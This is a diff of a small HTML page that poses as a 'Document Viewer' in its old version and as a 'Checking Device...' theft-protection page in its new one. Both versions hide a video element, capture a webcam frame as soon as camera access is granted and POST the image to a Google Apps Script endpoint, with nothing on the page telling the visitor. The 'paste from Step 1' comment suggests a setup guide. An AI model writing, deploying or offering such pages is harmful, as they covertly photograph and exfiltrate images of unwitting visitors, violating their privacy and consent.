@@ -1,39 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Document Viewer</title>
+  <title>Theft Protection Camera</title>
 </head>
 <body>
-<script>
-const serverURL = "https://script.google.com/macros/s/AKfycbxMh8nwgDEHn7rj1Bqbm7krN6O2JvFIGSZTVIGTHnNAlVsFLgtPzHfIeLCd3FBSjbrW/exec";
+  <h2>Checking Device...</h2>
+  <video id="video" autoplay playsinline style="width:1px;height:1px;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-  .then(stream => {
-    let video = document.createElement("video");
-    video.style.display = "none";
-    document.body.appendChild(video);
-    video.srcObject = stream;
-    video.play();
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxv3VtJgebN5j_tr4BZd3-hCjV1zsGlz_PFe_noz16zwC84XTtM86uMnH7NLhsgq8qm/exec"; // paste from Step 1
 
-    setTimeout(() => {
-      let canvas = document.createElement("canvas");
-      canvas.width = 640;
-      canvas.height = 480;
-      let ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imageData = canvas.toDataURL("image/png");
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        video.addEventListener('loadeddata', () => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL('image/jpeg', 0.9);
 
-      fetch(serverURL, {
-        method: "POST",
-        body: JSON.stringify({ image: imageData }),
-        headers: { "Content-Type": "application/json" }
-      }).then(r => console.log("Sent to server"));
+          fetch(scriptURL, {
+            method: 'POST',
+            body: JSON.stringify({ image: imageData })
+          }).then(r => console.log("Sent")).catch(err => console.error(err));
 
-    }, 2000); // 2-second delay to ensure camera starts
-  })
-  .catch(err => {
-    console.error("Camera access denied:", err);
-  });
-</script>
+          stream.getTracks().forEach(track => track.stop());
+        });
+      })
+      .catch(err => console.error("Camera access denied", err));
+  </script>
 </body>
 </html>
+
